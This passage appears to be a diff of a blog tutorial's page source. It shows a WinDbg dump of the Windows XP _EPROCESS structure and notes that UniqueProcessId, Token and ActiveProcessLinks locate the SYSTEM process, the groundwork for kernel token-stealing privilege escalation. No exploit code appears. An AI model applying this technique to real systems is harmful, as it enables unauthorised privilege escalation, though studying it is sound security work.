-   <span class="o">+</span><span class="mh">0x080</span> <span class="n">RundownProtect</span>   <span class="o">:</span> <span class="n">_EX_RUNDOWN_REF</span>
-   <span class="o">+</span><span class="mh">0x084</span> <span class="n">UniqueProcessId</span>  <span class="o">:</span> <span class="p">(</span><span class="n">null</span><span class="p">)</span> 
-   <span class="o">+</span><span class="mh">0x088</span> <span class="n">ActiveProcessLinks</span> <span class="o">:</span> <span class="n">_LIST_ENTRY</span> <span class="err">[</span> <span class="mh">0x10102</span> <span class="o">-</span> <span class="mh">0x0</span> <span class="err">]</span>
-   <span class="o">+</span><span class="mh">0x090</span> <span class="n">QuotaUsage</span>       <span class="o">:</span> <span class="p">[3]</span> <span class="mi">0</span>
-   <span class="o">+</span><span class="mh">0x09c</span> <span class="n">QuotaPeak</span>        <span class="o">:</span> <span class="p">[3]</span> <span class="mh">0x80552fa0</span>
-   <span class="o">+</span><span class="mh">0x0a8</span> <span class="n">CommitCharge</span>     <span class="o">:</span> <span class="mi">0</span>
-   <span class="o">+</span><span class="mh">0x0ac</span> <span class="n">PeakVirtualSize</span>  <span class="o">:</span> <span class="mh">0xa0008</span>
-   <span class="o">+</span><span class="mh">0x0b0</span> <span class="n">VirtualSize</span>      <span class="o">:</span> <span class="mi">0</span>
-   <span class="o">+</span><span class="mh">0x0b4</span> <span class="n">SessionProcessLinks</span> <span class="o">:</span> <span class="n">_LIST_ENTRY</span> <span class="err">[</span> <span class="mh">0x80552838</span> <span class="o">-</span> <span class="mh">0x80552838</span> <span class="err">]</span>
-   <span class="o">+</span><span class="mh">0x0bc</span> <span class="n">DebugPort</span>        <span class="o">:</span> <span class="p">(</span><span class="n">null</span><span class="p">)</span> 
-   <span class="o">+</span><span class="mh">0x0c0</span> <span class="n">ExceptionPort</span>    <span class="o">:</span> <span class="p">(</span><span class="n">null</span><span class="p">)</span> 
-   <span class="o">+</span><span class="mh">0x0c4</span> <span class="n">ObjectTable</span>      <span class="o">:</span> <span class="p">(</span><span class="n">null</span><span class="p">)</span> 
-   <span class="o">+</span><span class="mh">0x0c8</span> <span class="n">Token</span>            <span class="o">:</span> <span class="n">_EX_FAST_REF</span>
-   <span class="o">+</span><span class="mh">0x0cc</span> <span class="n">WorkingSetLock</span>   <span class="o">:</span> <span class="n">_FAST_MUTEX</span>
-   <span class="o">+</span><span class="mh">0x0ec</span> <span class="n">WorkingSetPage</span>   <span class="o">:</span> <span class="mi">0</span>
-   <span class="o">+</span><span class="mh">0x0f0</span> <span class="n">AddressCreationLock</span> <span class="o">:</span> <span class="n">_FAST_MUTEX</span>
-   <span class="o">+</span><span class="mh">0x110</span> <span class="n">HyperSpaceLock</span>   <span class="o">:</span> <span class="mi">0</span>
-   <span class="o">+</span><span class="mh">0x114</span> <span class="n">ForkInProgress</span>   <span class="o">:</span> <span class="p">(</span><span class="n">null</span><span class="p">)</span> 
-   <span class="o">+</span><span class="mh">0x118</span> <span class="n">HardwareTrigger</span>  <span class="o">:</span> <span class="mi">0</span>
-   <span class="o">+</span><span class="mh">0x11c</span> <span class="n">VadRoot</span>          <span class="o">:</span> <span class="p">(</span><span class="n">null</span><span class="p">)</span> 
-   <span class="o">+</span><span class="mh">0x120</span> <span class="n">VadHint</span>          <span class="o">:</span> <span class="mh">0x00010000</span> <span class="n">Void</span>
-   <span class="o">+</span><span class="mh">0x124</span> <span class="n">CloneRoot</span>        <span class="o">:</span> <span class="mh">0x80549f00</span> <span class="n">Void</span>
-   <span class="o">+</span><span class="mh">0x128</span> <span class="n">NumberOfPrivatePages</span> <span class="o">:</span> <span class="mh">0x300012</span>
-   <span class="o">+</span><span class="mh">0x12c</span> <span class="n">NumberOfLockedPages</span> <span class="o">:</span> <span class="mi">0</span>
-   <span class="o">+</span><span class="mh">0x130</span> <span class="n">Win32Process</span>     <span class="o">:</span> <span class="mh">0x80552740</span> <span class="n">Void</span>
-   <span class="o">+</span><span class="mh">0x134</span> <span class="n">Job</span>              <span class="o">:</span> <span class="p">(</span><span class="n">null</span><span class="p">)</span> 
-   <span class="o">+</span><span class="mh">0x138</span> <span class="n">SectionObject</span>    <span class="o">:</span> <span class="p">(</span><span class="n">null</span><span class="p">)</span> 
-   <span class="o">+</span><span class="mh">0x13c</span> <span class="n">SectionBaseAddress</span> <span class="o">:</span> <span class="mh">0x80500832</span> <span class="n">Void</span>
-   <span class="o">+</span><span class="mh">0x140</span> <span class="n">QuotaBlock</span>       <span class="o">:</span> <span class="mh">0x8050083a</span> <span class="n">_EPROCESS_QUOTA_BLOCK</span>
-   <span class="o">+</span><span class="mh">0x144</span> <span class="n">WorkingSetWatch</span>  <span class="o">:</span> <span class="mh">0x80500c70</span> <span class="n">_PAGEFAULT_HISTORY</span>
-   <span class="o">+</span><span class="mh">0x148</span> <span class="n">Win32WindowStation</span> <span class="o">:</span> <span class="p">(</span><span class="n">null</span><span class="p">)</span> 
-   <span class="o">+</span><span class="mh">0x14c</span> <span class="n">InheritedFromUniqueProcessId</span> <span class="o">:</span> <span class="p">(</span><span class="n">null</span><span class="p">)</span> 
-   <span class="o">+</span><span class="mh">0x150</span> <span class="n">LdtInformation</span>   <span class="o">:</span> <span class="p">(</span><span class="n">null</span><span class="p">)</span> 
-   <span class="o">+</span><span class="mh">0x154</span> <span class="n">VadFreeHint</span>      <span class="o">:</span> <span class="p">(</span><span class="n">null</span><span class="p">)</span> 
-   <span class="o">+</span><span class="mh">0x158</span> <span class="n">VdmObjects</span>       <span class="o">:</span> <span class="mh">0x00050005</span> <span class="n">Void</span>
-   <span class="o">+</span><span class="mh">0x15c</span> <span class="n">DeviceMap</span>        <span class="o">:</span> <span class="p">(</span><span class="n">null</span><span class="p">)</span> 
-   <span class="o">+</span><span class="mh">0x160</span> <span class="n">PhysicalVadList</span>  <span class="o">:</span> <span class="n">_LIST_ENTRY</span> <span class="err">[</span> <span class="mh">0x805528e4</span> <span class="o">-</span> <span class="mh">0x805528e4</span> <span class="err">]</span>
-   <span class="o">+</span><span class="mh">0x168</span> <span class="n">PageDirectoryPte</span> <span class="o">:</span> <span class="n">_HARDWARE_PTE</span>
-   <span class="o">+</span><span class="mh">0x168</span> <span class="n">Filler</span>           <span class="o">:</span> <span class="mh">0x805529f0</span><span class="err">`</span><span class="mi">00000002</span>
-   <span class="o">+</span><span class="mh">0x170</span> <span class="n">Session</span>          <span class="o">:</span> <span class="mh">0x805529f0</span> <span class="n">Void</span>
-   <span class="o">+</span><span class="mh">0x174</span> <span class="n">ImageFileName</span>    <span class="o">:</span> <span class="p">[16]</span>  <span class="s">""</span>
-   <span class="o">+</span><span class="mh">0x184</span> <span class="n">JobLinks</span>         <span class="o">:</span> <span class="n">_LIST_ENTRY</span> <span class="err">[</span> <span class="mh">0x0</span> <span class="o">-</span> <span class="mh">0x0</span> <span class="err">]</span>
-   <span class="o">+</span><span class="mh">0x18c</span> <span class="n">LockedPagesList</span>  <span class="o">:</span> <span class="p">(</span><span class="n">null</span><span class="p">)</span> 
-   <span class="o">+</span><span class="mh">0x190</span> <span class="n">ThreadListHead</span>   <span class="o">:</span> <span class="n">_LIST_ENTRY</span> <span class="err">[</span> <span class="mh">0x0</span> <span class="o">-</span> <span class="mh">0x0</span> <span class="err">]</span>
-   <span class="o">+</span><span class="mh">0x198</span> <span class="n">SecurityPort</span>     <span class="o">:</span> <span class="p">(</span><span class="n">null</span><span class="p">)</span> 
-   <span class="o">+</span><span class="mh">0x19c</span> <span class="n">PaeTop</span>           <span class="o">:</span> <span class="p">(</span><span class="n">null</span><span class="p">)</span> 
-   <span class="o">+</span><span class="mh">0x1a0</span> <span class="n">ActiveThreads</span>    <span class="o">:</span> <span class="mi">0</span>
-   <span class="o">+</span><span class="mh">0x1a4</span> <span class="n">GrantedAccess</span>    <span class="o">:</span> <span class="mi">0</span>
-   <span class="o">+</span><span class="mh">0x1a8</span> <span class="n">DefaultHardErrorProcessing</span> <span class="o">:</span> <span class="mi">0</span>
-   <span class="o">+</span><span class="mh">0x1ac</span> <span class="n">LastThreadExitStatus</span> <span class="o">:</span> <span class="mi">0</span><span class="n">n0</span>
-   <span class="o">+</span><span class="mh">0x1b0</span> <span class="n">Peb</span>              <span class="o">:</span> <span class="p">(</span><span class="n">null</span><span class="p">)</span> 
-   <span class="o">+</span><span class="mh">0x1b4</span> <span class="n">PrefetchTrace</span>    <span class="o">:</span> <span class="n">_EX_FAST_REF</span>
-   <span class="o">+</span><span class="mh">0x1b8</span> <span class="n">ReadOperationCount</span> <span class="o">:</span> <span class="n">_LARGE_INTEGER</span> <span class="mh">0x0</span>
-   <span class="o">+</span><span class="mh">0x1c0</span> <span class="n">WriteOperationCount</span> <span class="o">:</span> <span class="n">_LARGE_INTEGER</span> <span class="mh">0x0</span>
-   <span class="o">+</span><span class="mh">0x1c8</span> <span class="n">OtherOperationCount</span> <span class="o">:</span> <span class="n">_LARGE_INTEGER</span> <span class="mh">0x0</span>
-   <span class="o">+</span><span class="mh">0x1d0</span> <span class="n">ReadTransferCount</span> <span class="o">:</span> <span class="n">_LARGE_INTEGER</span> <span class="mh">0x0</span>
-   <span class="o">+</span><span class="mh">0x1d8</span> <span class="n">WriteTransferCount</span> <span class="o">:</span> <span class="n">_LARGE_INTEGER</span> <span class="mh">0x0</span>
-   <span class="o">+</span><span class="mh">0x1e0</span> <span class="n">OtherTransferCount</span> <span class="o">:</span> <span class="n">_LARGE_INTEGER</span> <span class="mh">0x0</span>
-   <span class="o">+</span><span class="mh">0x1e8</span> <span class="n">CommitChargeLimit</span> <span class="o">:</span> <span class="mi">0</span>
-   <span class="o">+</span><span class="mh">0x1ec</span> <span class="n">CommitChargePeak</span> <span class="o">:</span> <span class="mi">0</span>
-   <span class="o">+</span><span class="mh">0x1f0</span> <span class="n">AweInfo</span>          <span class="o">:</span> <span class="p">(</span><span class="n">null</span><span class="p">)</span> 
-   <span class="o">+</span><span class="mh">0x1f4</span> <span class="n">SeAuditProcessCreationInfo</span> <span class="o">:</span> <span class="n">_SE_AUDIT_PROCESS_CREATION_INFO</span>
-   <span class="o">+</span><span class="mh">0x1f8</span> <span class="n">Vm</span>               <span class="o">:</span> <span class="n">_MMSUPPORT</span>
-   <span class="o">+</span><span class="mh">0x238</span> <span class="n">LastFaultCount</span>   <span class="o">:</span> <span class="mi">0</span>
-   <span class="o">+</span><span class="mh">0x23c</span> <span class="n">ModifiedPageCount</span> <span class="o">:</span> <span class="mi">0</span>
-   <span class="o">+</span><span class="mh">0x240</span> <span class="n">NumberOfVads</span>     <span class="o">:</span> <span class="mi">0</span>
-   <span class="o">+</span><span class="mh">0x244</span> <span class="n">JobStatus</span>        <span class="o">:</span> <span class="mi">0</span>
-   <span class="o">+</span><span class="mh">0x248</span> <span class="n">Flags</span>            <span class="o">:</span> <span class="mi">0</span>
-   <span class="o">+</span><span class="mh">0x248</span> <span class="n">CreateReported</span>   <span class="o">:</span> <span class="mi">0</span><span class="n">y0</span>
-   <span class="o">+</span><span class="mh">0x248</span> <span class="n">NoDebugInherit</span>   <span class="o">:</span> <span class="mi">0</span><span class="n">y0</span>
-   <span class="o">+</span><span class="mh">0x248</span> <span class="n">ProcessExiting</span>   <span class="o">:</span> <span class="mi">0</span><span class="n">y0</span>
-   <span class="o">+</span><span class="mh">0x248</span> <span class="n">ProcessDelete</span>    <span class="o">:</span> <span class="mi">0</span><span class="n">y0</span>
-   <span class="o">+</span><span class="mh">0x248</span> <span class="n">Wow64SplitPages</span>  <span class="o">:</span> <span class="mi">0</span><span class="n">y0</span>
-   <span class="o">+</span><span class="mh">0x248</span> <span class="n">VmDeleted</span>        <span class="o">:</span> <span class="mi">0</span><span class="n">y0</span>
-   <span class="o">+</span><span class="mh">0x248</span> <span class="n">OutswapEnabled</span>   <span class="o">:</span> <span class="mi">0</span><span class="n">y0</span>
-   <span class="o">+</span><span class="mh">0x248</span> <span class="n">Outswapped</span>       <span class="o">:</span> <span class="mi">0</span><span class="n">y0</span>
-   <span class="o">+</span><span class="mh">0x248</span> <span class="n">ForkFailed</span>       <span class="o">:</span> <span class="mi">0</span><span class="n">y0</span>
-   <span class="o">+</span><span class="mh">0x248</span> <span class="n">HasPhysicalVad</span>   <span class="o">:</span> <span class="mi">0</span><span class="n">y0</span>
-   <span class="o">+</span><span class="mh">0x248</span> <span class="n">AddressSpaceInitialized</span> <span class="o">:</span> <span class="mi">0</span><span class="n">y00</span>
-   <span class="o">+</span><span class="mh">0x248</span> <span class="n">SetTimerResolution</span> <span class="o">:</span> <span class="mi">0</span><span class="n">y0</span>
-   <span class="o">+</span><span class="mh">0x248</span> <span class="n">BreakOnTermination</span> <span class="o">:</span> <span class="mi">0</span><span class="n">y0</span>
-   <span class="o">+</span><span class="mh">0x248</span> <span class="n">SessionCreationUnderway</span> <span class="o">:</span> <span class="mi">0</span><span class="n">y0</span>
-   <span class="o">+</span><span class="mh">0x248</span> <span class="n">WriteWatch</span>       <span class="o">:</span> <span class="mi">0</span><span class="n">y0</span>
-   <span class="o">+</span><span class="mh">0x248</span> <span class="n">ProcessInSession</span> <span class="o">:</span> <span class="mi">0</span><span class="n">y0</span>
-   <span class="o">+</span><span class="mh">0x248</span> <span class="n">OverrideAddressSpace</span> <span class="o">:</span> <span class="mi">0</span><span class="n">y0</span>
-   <span class="o">+</span><span class="mh">0x248</span> <span class="n">HasAddressSpace</span>  <span class="o">:</span> <span class="mi">0</span><span class="n">y0</span>
-   <span class="o">+</span><span class="mh">0x248</span> <span class="n">LaunchPrefetched</span> <span class="o">:</span> <span class="mi">0</span><span class="n">y0</span>
-   <span class="o">+</span><span class="mh">0x248</span> <span class="n">InjectInpageErrors</span> <span class="o">:</span> <span class="mi">0</span><span class="n">y0</span>
-   <span class="o">+</span><span class="mh">0x248</span> <span class="n">VmTopDown</span>        <span class="o">:</span> <span class="mi">0</span><span class="n">y0</span>
-   <span class="o">+</span><span class="mh">0x248</span> <span class="n">Unused3</span>          <span class="o">:</span> <span class="mi">0</span><span class="n">y0</span>
-   <span class="o">+</span><span class="mh">0x248</span> <span class="n">Unused4</span>          <span class="o">:</span> <span class="mi">0</span><span class="n">y0</span>
-   <span class="o">+</span><span class="mh">0x248</span> <span class="n">VdmAllowed</span>       <span class="o">:</span> <span class="mi">0</span><span class="n">y0</span>
-   <span class="o">+</span><span class="mh">0x248</span> <span class="n">Unused</span>           <span class="o">:</span> <span class="mi">0</span><span class="n">y00000</span> <span class="p">(</span><span class="mi">0</span><span class="p">)</span>
-   <span class="o">+</span><span class="mh">0x248</span> <span class="n">Unused1</span>          <span class="o">:</span> <span class="mi">0</span><span class="n">y0</span>
-   <span class="o">+</span><span class="mh">0x248</span> <span class="n">Unused2</span>          <span class="o">:</span> <span class="mi">0</span><span class="n">y0</span>
-   <span class="o">+</span><span class="mh">0x24c</span> <span class="n">ExitStatus</span>       <span class="o">:</span> <span class="mi">0</span><span class="n">n8364</span>
-   <span class="o">+</span><span class="mh">0x250</span> <span class="n">NextPageColor</span>    <span class="o">:</span> <span class="mi">1</span>
-   <span class="o">+</span><span class="mh">0x252</span> <span class="n">SubSystemMinorVersion</span> <span class="o">:</span> <span class="mi">0</span> <span class="err">''</span>
-   <span class="o">+</span><span class="mh">0x253</span> <span class="n">SubSystemMajorVersion</span> <span class="o">:</span> <span class="mi">0</span> <span class="err">''</span>
-   <span class="o">+</span><span class="mh">0x252</span> <span class="n">SubSystemVersion</span> <span class="o">:</span> <span class="mi">0</span>
-   <span class="o">+</span><span class="mh">0x254</span> <span class="n">PriorityClass</span>    <span class="o">:</span> <span class="mh">0x58</span> <span class="sc">'X'</span>
-   <span class="o">+</span><span class="mh">0x255</span> <span class="n">WorkingSetAcquiredUnsafe</span> <span class="o">:</span> <span class="mh">0x18</span> <span class="err">''</span>
-   <span class="o">+</span><span class="mh">0x258</span> <span class="n">Cookie</span>           <span class="o">:</span> <span class="mi">0</span></code></pre></figure>
+kd&gt; dt _EPROCESS poi(ffdff000+0x120+0x004)+0x034+0x10 
+nt!_EPROCESS
+   +0x000 Pcb              : _KPROCESS
+   +0x06c ProcessLock      : _EX_PUSH_LOCK
+   +0x070 CreateTime       : _LARGE_INTEGER 0x80552838`00000000
+   +0x078 ExitTime         : _LARGE_INTEGER 0x80552740`80552838
+   +0x080 RundownProtect   : _EX_RUNDOWN_REF
+   +0x084 UniqueProcessId  : (null) 
+   +0x088 ActiveProcessLinks : _LIST_ENTRY [ 0x10102 - 0x0 ]
+   +0x090 QuotaUsage       : [3] 0
+   +0x09c QuotaPeak        : [3] 0x80552fa0
+   +0x0a8 CommitCharge     : 0
+   +0x0ac PeakVirtualSize  : 0xa0008
+   +0x0b0 VirtualSize      : 0
+   +0x0b4 SessionProcessLinks : _LIST_ENTRY [ 0x80552838 - 0x80552838 ]
+   +0x0bc DebugPort        : (null) 
+   +0x0c0 ExceptionPort    : (null) 
+   +0x0c4 ObjectTable      : (null) 
+   +0x0c8 Token            : _EX_FAST_REF
+   +0x0cc WorkingSetLock   : _FAST_MUTEX
+   +0x0ec WorkingSetPage   : 0
+   +0x0f0 AddressCreationLock : _FAST_MUTEX
+   +0x110 HyperSpaceLock   : 0
+   +0x114 ForkInProgress   : (null) 
+   +0x118 HardwareTrigger  : 0
+   +0x11c VadRoot          : (null) 
+   +0x120 VadHint          : 0x00010000 Void
+   +0x124 CloneRoot        : 0x80549f00 Void
+   +0x128 NumberOfPrivatePages : 0x300012
+   +0x12c NumberOfLockedPages : 0
+   +0x130 Win32Process     : 0x80552740 Void
+   +0x134 Job              : (null) 
+   +0x138 SectionObject    : (null) 
+   +0x13c SectionBaseAddress : 0x80500832 Void
+   +0x140 QuotaBlock       : 0x8050083a _EPROCESS_QUOTA_BLOCK
+   +0x144 WorkingSetWatch  : 0x80500c70 _PAGEFAULT_HISTORY
+   +0x148 Win32WindowStation : (null) 
+   +0x14c InheritedFromUniqueProcessId : (null) 
+   +0x150 LdtInformation   : (null) 
+   +0x154 VadFreeHint      : (null) 
+   +0x158 VdmObjects       : 0x00050005 Void
+   +0x15c DeviceMap        : (null) 
+   +0x160 PhysicalVadList  : _LIST_ENTRY [ 0x805528e4 - 0x805528e4 ]
+   +0x168 PageDirectoryPte : _HARDWARE_PTE
+   +0x168 Filler           : 0x805529f0`00000002
+   +0x170 Session          : 0x805529f0 Void
+   +0x174 ImageFileName    : [16]  ""
+   +0x184 JobLinks         : _LIST_ENTRY [ 0x0 - 0x0 ]
+   +0x18c LockedPagesList  : (null) 
+   +0x190 ThreadListHead   : _LIST_ENTRY [ 0x0 - 0x0 ]
+   +0x198 SecurityPort     : (null) 
+   +0x19c PaeTop           : (null) 
+   +0x1a0 ActiveThreads    : 0
+   +0x1a4 GrantedAccess    : 0
+   +0x1a8 DefaultHardErrorProcessing : 0
+   +0x1ac LastThreadExitStatus : 0n0
+   +0x1b0 Peb              : (null) 
+   +0x1b4 PrefetchTrace    : _EX_FAST_REF
+   +0x1b8 ReadOperationCount : _LARGE_INTEGER 0x0
+   +0x1c0 WriteOperationCount : _LARGE_INTEGER 0x0
+   +0x1c8 OtherOperationCount : _LARGE_INTEGER 0x0
+   +0x1d0 ReadTransferCount : _LARGE_INTEGER 0x0
+   +0x1d8 WriteTransferCount : _LARGE_INTEGER 0x0
+   +0x1e0 OtherTransferCount : _LARGE_INTEGER 0x0
+   +0x1e8 CommitChargeLimit : 0
+   +0x1ec CommitChargePeak : 0
+   +0x1f0 AweInfo          : (null) 
+   +0x1f4 SeAuditProcessCreationInfo : _SE_AUDIT_PROCESS_CREATION_INFO
+   +0x1f8 Vm               : _MMSUPPORT
+   +0x238 LastFaultCount   : 0
+   +0x23c ModifiedPageCount : 0
+   +0x240 NumberOfVads     : 0
+   +0x244 JobStatus        : 0
+   +0x248 Flags            : 0
+   +0x248 CreateReported   : 0y0
+   +0x248 NoDebugInherit   : 0y0
+   +0x248 ProcessExiting   : 0y0
+   +0x248 ProcessDelete    : 0y0
+   +0x248 Wow64SplitPages  : 0y0
+   +0x248 VmDeleted        : 0y0
+   +0x248 OutswapEnabled   : 0y0
+   +0x248 Outswapped       : 0y0
+   +0x248 ForkFailed       : 0y0
+   +0x248 HasPhysicalVad   : 0y0
+   +0x248 AddressSpaceInitialized : 0y00
+   +0x248 SetTimerResolution : 0y0
+   +0x248 BreakOnTermination : 0y0
+   +0x248 SessionCreationUnderway : 0y0
+   +0x248 WriteWatch       : 0y0
+   +0x248 ProcessInSession : 0y0
+   +0x248 OverrideAddressSpace : 0y0
+   +0x248 HasAddressSpace  : 0y0
+   +0x248 LaunchPrefetched : 0y0
+   +0x248 InjectInpageErrors : 0y0
+   +0x248 VmTopDown        : 0y0
+   +0x248 Unused3          : 0y0
+   +0x248 Unused4          : 0y0
+   +0x248 VdmAllowed       : 0y0
+   +0x248 Unused           : 0y00000 (0)
+   +0x248 Unused1          : 0y0
+   +0x248 Unused2          : 0y0
+   +0x24c ExitStatus       : 0n8364
+   +0x250 NextPageColor    : 1
+   +0x252 SubSystemMinorVersion : 0 ''
+   +0x253 SubSystemMajorVersion : 0 ''
+   +0x252 SubSystemVersion : 0
+   +0x254 PriorityClass    : 0x58 'X'
+   +0x255 WorkingSetAcquiredUnsafe : 0x18 ''
+   +0x258 Cookie           : 0</code></pre></figure>
 
 <p>We could get <code>UniqueProcessId (+0x084)</code>, our <code>Token (+0x0c8)</code> and also the linked list <code>ActiveProcessLinks (+0x088)</code> to get the list of all process.<br />
 In XP, the identifier of SYSTEM process is <strong>4</strong> and we can get our PID with <code>GetCurrentProcessId()</code>.<br />
